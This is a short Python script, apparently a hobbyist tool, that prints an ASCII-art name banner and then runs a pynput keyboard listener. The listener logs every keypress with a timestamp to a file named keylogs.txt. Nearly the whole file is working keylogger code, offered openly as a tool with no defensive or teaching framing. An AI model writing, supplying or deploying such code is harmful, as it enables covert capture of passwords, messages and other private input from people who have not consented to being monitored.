from pynput.keyboard import Key, Listener
import logging
print(''' GGGGGGGGGG	OOOOOOOOO   UU    UU  SSSSSSSSS  HH    HH  AAAAAAAA  LL
	  GG		OO     OO   UU    UU  SS         HH    HH  AA    AA  LL
	  GG    GGGGG	OO     OO   UU	  UU  SSSSSSSSS  HHHHHHHH  AAAAAAAA  LL
	  GG    GG GG	OO     OO   UU	  UU         SS  HH    HH  AA    AA  LL
	  GGGGGGGG GG	OOOOOOOOO   UUUUUUUU  SSSSSSSSS  HH    HH  AA    AA  LLLLLLLLLL
''')

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
